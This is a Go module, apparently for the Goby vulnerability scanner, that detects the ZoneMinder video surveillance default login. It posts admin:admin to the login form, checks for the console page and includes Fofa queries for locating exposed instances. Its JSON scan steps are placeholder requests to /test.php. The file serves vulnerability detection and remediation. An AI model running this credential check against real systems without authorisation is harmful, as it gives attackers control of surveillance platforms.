package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ZoneMinder Video Surveillance System Default Password Vulnerability",
    "Description": "<p>ZoneMinder is an open source video surveillance system.</p><p>ZoneMinder has a default password of admin:admin. Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Product": "ZoneMinder",
    "Homepage": "http://www.zoneminder.com/",
    "DisclosureDate": "2023-03-03",
    "Author": "635477622@qq.com",
    "FofaQuery": "body=\"ZoneMinder Login\" || header=\"ZMSESSID\" || banner=\"ZMSESSID\"",
    "GobyQuery": "body=\"ZoneMinder Login\" || header=\"ZMSESSID\" || banner=\"ZMSESSID\"",
    "Level": "2",
    "Impact": "<p>ZoneMinder has a default password of admin:admin. Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://zoneminder.readthedocs.io/en/latest/faq.html?how-do-i-enable-zoneminder-s-security"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "ZoneMinder 视频监控系统默认口令漏洞",
            "Product": "ZoneMinder",
            "Description": "<p>ZoneMinder 是一款开源视频监控系统。</p><p>ZoneMinder&nbsp; 存在默认口令 admin:admin 攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>ZoneMinder&nbsp; 存在默认口令 admin:admin 攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "ZoneMinder Video Surveillance System Default Password Vulnerability",
            "Product": "ZoneMinder",
            "Description": "<p>ZoneMinder is an open source video surveillance system.</p><p>ZoneMinder has a default password of admin:admin. Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>ZoneMinder has a default password of admin:admin. Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10829"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/index.php")
			cfg.FollowRedirect = true
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "action=login&view=login&username=admin&password=admin"
			rsp, _ := httpclient.DoHttpRequest(u, cfg)
			result := rsp != nil && rsp.StatusCode == 200 && !strings.Contains(rsp.Utf8Html, "Invalid username or password") && strings.Contains(rsp.Utf8Html, "var currentView = 'console'")
			if result {
				ss.VulURL = u.Scheme() + "://admin:admin@" + u.HostInfo
			}
			return result
		}, nil,
	))
}
